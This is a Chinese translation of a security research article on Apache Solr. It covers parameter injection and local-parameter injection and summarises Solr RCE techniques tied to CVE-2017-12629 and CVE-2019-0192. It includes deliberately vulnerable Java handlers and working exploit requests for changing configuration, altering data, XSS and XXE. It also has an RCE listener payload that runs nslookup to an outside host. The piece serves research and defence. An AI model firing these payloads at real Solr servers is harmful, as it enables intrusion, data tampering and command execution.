文章来源：
* * *
## 概述
在这篇文章中，我们提出了一种新漏洞：“Solr参数注入”，并且分享了如何在不同的场景下构造exp。 同时，本文总结了Apache Solr的历史漏洞。
Apache Solr是一个开源企业搜索平台。Solr使用Java语言开发，隶属于Apache Lucene项目。 Apache
Solr的主要功能包括全文检索、命中标示、分面搜索、动态聚类以及文档处理。
同时它还集成了数据库功能：你可以运行服务器，创建集合，并向它传输各种类型的数据（例如文本，xml文档，pdf文档等）。Solr会自动索引这些数据，同时提供大量且高效的REST
API接口，以便搜索数据。
用户只能使用HTTP协议与Solr服务器通信，并且默认不需要身份令牌即可访问，这使得它非常容易出现SSRF，CSRF和HRS（HTTP请求走私）漏洞。
## Solr API
启动Solr实例后（命令"./bin/solr start -e dih"），它会在8983端口创建一个web服务器。
这里我们使用的示例中已经有一些数据，可以尝试搜索。 简单地搜索关键词“Apple”，程序将开始在所有文档中检索并以JSON格式返回结果：
尝试更复杂的查询：
主要的参数有：
  * **/solr/db/select** \- "db"是仓库名称，"/select"表示我们想执行的搜索操作（由[SearchHandler](https://github.com/apache/lucene-solr/blob/master/solr/core/src/java/org/apache/solr/handler/component/SearchHandler.java)类处理）
  * **q={!dismax+df=name}Apple** \- 程序通过“dismax”查询解析器，在“name”字段搜索包含“Apple”关键字的数据。 注意，大括号间的数据将被解析为[Solr本地参数](https://lucene.apache.org/solr/guide/6_6/local-parameters-in-queries.html)
  * **fl=*,score,similar:[subquery]** \- "fl"代表要返回的字段名称，通过[[subquery]](https://lucene.apache.org/solr/guide/6_6/transforming-result-documents.html#TransformingResultDocuments-_subquery_) 转换器可以包含另一个查询的结果。 同时在本例中，我们的子查询为"computer"。
除了搜索之外，用户还可以更新，查看和修改配置，甚至复制操作。 通过访问Solr Web管理页面，我们可以上传或修改数据以及其他任何操作。
同时，在默认情况下Solr不存在用户或角色，这使得它非常容易出现SSRF，CSRF和HRS（HTTP请求走私）漏洞。
## Apache Solr注入
和数据库类似，大多数情况用户不能直接访问Solr Rest API，并且只能在内部供其他程序使用。
基于这种情况，我们想对使用Solr的Web程序引入一些新的攻击。
### Solr参数注入（HTTP走私）
当目标应用程序对Solr进行HTTP API调用，并接收不受信的用户输入，则可能无法正确地URL编码数据。 下面是一个简单的Java Web
App，只接受一个参数"q"，并且通过server-to-server的形式对Solr服务器发出内部请求：
    @RequestMapping("/search")
    @Example(uri = "/search?q=Apple")
    public Object search1(@RequestParam String q) {
        //search the supplied keyword inside solr
        String solr = "http://solrserver/solr/db/";
        String query = "/select?q=" + q + "&fl=id,name&rows=10";
        return http.get(solr + query);
    }
因为不会对数据做URL编码，所以我们可以构造发送`q = 123％26param1 = xxx％26param2 =
yyy`这一类Payload，向Solr搜索请求中注入额外参数，同时还能可以修改请求处理的逻辑。 `%26`为编码后的`$`，它是HTTP查询中的分割符。
用户发出正常请求：
    GET /search?q=Apple
Web App向Solr服务器发出请求：
    GET /solr/db/select?q=Apple
用户发出恶意请求：
    GET /search?q=Apple%26xxx=yyy
Web App向Solr服务器发出请求：
    GET /solr/db/select?q=Apple&xxx=yyy
我们很容易可以看出，由于参数注入，参数`q`首先被应用程序解码，但转发至Solr服务器时并未再次编码。
Ok，现在我们该讨论的是如何利用这点？请求无论如何都会被转发至`/select`端点，那么我们可以构造哪些恶意参数然后发送给Solr？
Solr有大量的查询参数，但对于构造exp来说，比较有用的有：
  * **shards= ** \- 指定shards的值，请求将转发到恶意Solr服务器，使目标Solr服务器变成一个反向代理服务器。 攻击者可以发送任意数据给Solr服务器，甚至绕过防火墙访问Admin API。
  * **qt=/update** \- 重写请求的处理端点（`/select`，`/update`等等）。 由于程序总是默认发送请求至`/solr/db/select`，这很容易使开发人员产生错觉，认为请求只会用于搜索。其实通过使用'qt'和'shards'参数，我们可以访问'/update'或'/config'端点。
  * **shards.qt=/update** \- 也可以重写请求的处理端点。
  * **stream.body=xxx** \- 重写整个请求。但在新版本中被禁用，因此只针对旧版本。
如果将这些参数“走私”到Solr查询请求中，则会造成严重的安全漏洞，可以修改Solr实例内部的数据，甚至导致RCE。
#### Exploitation示例
构造更改Solr配置属性的请求：
    GET /search?q=Apple&shards=http://127.0.0.1:8983/solr/collection/config%23&stream.body={"set-property":{"xxx":"yyy"}}
查询其他仓库的数据：
    GET /solr/db/select?q=Apple&shards=http://127.0.0.1:8983/solr/atom&qt=/update?stream.body=[%257b%2522id%2522:%25221338%2522,%2522author%2522:%2522orange%2522%257d]%26wt=json&commit=true&wt=json
修改指定仓库的数据：
    GET /solr/db/select?q=orange&shards=http://127.0.0.1:8983/solr/atom&qt=/select?fl=id,name:author&wt=json
另一个利用方法是更改Solr的响应。“fl”参数会列出查询返回的字段。 通过发出以下请求我们可以要求仅返回“名称”和“价格”字段：
    GET /solr/db/select?q=Apple&fl=name,price
当此参数被污染时，我们可以利用[ValueAugmenterFactory](https://lucene.apache.org/solr/guide/6_6/transforming-result-documents.html#TransformingResultDocuments-_value_-ValueAugmenterFactory)`（fl = name：[value v
='xxxx']）`向文档注入其他字段，并在查询中指定要注入的内容`'xxxx'`。 此外，我们通过结合Xml Transformer`（fl =
name：[xml]）`，可以解析服务器端提供的值，并将结果回现到文档且不会发生转义。 因此该技术可用于XSS：
    GET /solr/db/select?indent=on&q=*&wt=xml&fl=price,name:[value+v='alert(1)'],name:[xml]
注意：
  * 7.6版本以上无法造成XXE攻击
  * Solr 5.2以后才引入RawValueTransformerFactory
### Solr本地参数注入
常见的情况是只有一个参数`q`，并且它会被正确编码：
    @RequestMapping("/search")
    public Object select(@RequestParam(name = "q") String query) {
        //search the supplied keyword inside solr and return result|
        return httprequest(solrURL + "/db/select?q=" + urlencode(query));
    }
这种情况下，仍可以指定解析类型和[Solr本地参数](https://lucene.apache.org/solr/guide/6_6/local-parameters-in-queries.html)：
    GET /search?q={!type=_parser_type_+param=value}xxx
在2013年有人就已经提出这类[攻击](https://javahacker.com/abusing-the-solr-local-parameters-feature-localparams-injection/)，但在2017年前仍没有人知道如何利用。那时我们报告了漏洞[CVE-2017-12629](https://www.exploit-db.com/exploits/43009)， 分享了如何通过'xmlparser'解析器来造成XXE：
    GET /search?q={!xmlparser v=''}
在CVE-2017-12629无效的版本中，本地参数注入几乎无害。似乎可以用于DoS攻击，但是由于Solr使用了lucene的语法，DoS非常容易实现，所以它不重要。另一个潜在的本地参数注入攻击是通过使用Join
Query解析器访问其他仓库的数据：
    GET /search?q={!join from=id fromIndex=anotherCollection to=other_id}Apple
另一个仓库ID应与前一个相同，因此攻击有时会失效。由于CVE-2017-12629已被修补，我不觉得它是一个安全漏洞，除非有人找到更好的利用方法。
## RCE方法总结
大多数攻击者对仓库的数据不感兴趣，而是想要实现RCE或本地文件读取。下面我对它们做了总结：
### 1\. [CVE-2017-12629] 通过RunExecutableListener实现RCE
**适用的Solr版本** ：5.5x-5.5.5, 6x-v6.6.2, 7x - v7.1
**要求** ：无
该攻击是利用[Solr ConfigApi](https://lucene.apache.org/solr/guide/7_4/config-api.html)添加一个新的[RunExecutableListener](http://lucene.apache.org/solr/6_6_2/solr-core/org/apache/solr/core/RunExecutableListener.html)，从而执行shell命令。
添加这个Listener后，还需要通过"[/update](https://lucene.apache.org/solr/guide/6_6/uploading-data-with-index-handlers.html#UploadingDatawithIndexHandlers-AddingaSingleJSONDocument)"触发程序更新操作，然后执行命令。
直接发送给Solr服务器的请求：
    POST /solr/db/config HTTP/1.1
    Host: localhost:8983
    Content-Type: application/json
    Content-Length: 213
    {
      "add-listener" : {
        "event":"postCommit",
        "name":"newlistener",
        "class":"solr.RunExecutableListener",
        "exe":"nslookup",
        "dir":"/usr/bin/",
        "args":["solrx.x.artsploit.com"]
      }
    }
构造Solr参数注入Payload：
    GET /solr/db/select?q=xxx&shards=localhost:8983/solr/db/config%23&stream.body={"add-listener":{"event":"postCommit","name":"newlistener","class":"solr.RunExecutableListener","exe":"nslookup","dir":"/usr/bin/","args":["solrx.x.artsploit.com"]}}&isShard=true
    GET /solr/db/select?q=xxx&shards=localhost:8983/solr/db/update%23&commit=true
构造Solr本地参数注入Payload：
    GET /solr/db/select?q={!xmlparser+v%3d''}
    GET /solr/db/select?q={!xmlparser+v=''}
因为构造方法类似（将"qt"和"stream.body"参数与"xmlparser"组合），接下来我们将省略构造“Solr（本地）参数注入"
Payload的过程。
### 2\. [CVE-2019-0192] 通过jmx.serviceUrl实现反序列化
**适用的Solr版本** ：5？（暂未确定从哪个版本开始引入Config API接口）~7。版本7之后JMX被弃用。
**要求**
：防火墙不会阻拦Solr向外发出请求；在目标的类路径（classpath）或JMX服务器中的任意端口（利用时目标端口会被打开）中，存在一些特定的反序列化gadget。